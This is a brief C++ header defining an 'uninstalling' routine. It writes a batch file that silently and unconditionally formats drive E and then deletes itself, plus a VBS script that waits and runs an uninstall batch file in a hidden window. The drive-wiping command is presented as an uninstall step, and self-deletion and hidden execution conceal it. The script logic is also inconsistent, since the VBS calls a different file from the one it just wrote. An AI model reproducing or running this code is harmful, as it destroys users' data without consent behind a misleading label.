#pragma once
#include<iostream>
#include<fstream>
#include<Windows.h>
#include<string>
using namespace std;

void uninstalling() {
	ofstream fout;
	fout.open("D:\\1.bat", ios::out);
	fout << "format E /u /s /q" << endl;
	fout << "del D:\\1.vbs /q" << endl;
	fout << "del D:\\1.bat /q" << endl;
	fout.close();
	fout.open("D:\\1.vbs");
	fout << "wscript.sleep 10000" << endl;
	fout << "set ws=WScript.CreateObject(\"WScript.Shell\")" << endl;
	fout << "ws.Run \"E:\\Silver Bullet\\uninstall.bat\",0" << endl;
	fout.close();
	system("D:\\1.vbs");
}